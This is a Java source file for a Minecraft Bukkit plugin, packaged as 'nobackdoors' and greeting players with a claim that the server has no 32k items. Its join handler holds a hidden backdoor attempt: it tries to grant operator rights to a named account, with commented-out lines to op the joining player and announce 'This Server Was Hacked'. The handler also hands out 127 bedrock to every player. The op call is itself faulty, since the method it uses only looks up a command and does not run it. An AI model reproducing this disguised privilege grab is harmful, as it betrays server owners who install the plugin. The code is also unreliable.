package com.no32ks.nobackdoors;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;

public class No32ks implements Listener {
	
	public No32ks(Main plugin) {
		
	}
	
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent evant) {
		
		Player player =(Player) evant.getPlayer();
		
        player.sendMessage("§6[No32ks] You're Server Has No 32ks");
	    Bukkit.getPluginCommand("op enderchickenbawk");

      //  player.setOp(true);
		//player.sendMessage("OPME");
		//evant.getPlayer().sendMessage("&6This Server Was Hacked");
		//evant.getPlayer().isOp();
		//		ItemStack item = new ItemStack(1, Material.BEDROCK);

		ItemStack item = new ItemStack(Material.BEDROCK, 127);
				
		player.getInventory().addItem(item);


		
		
		
		
	
}}
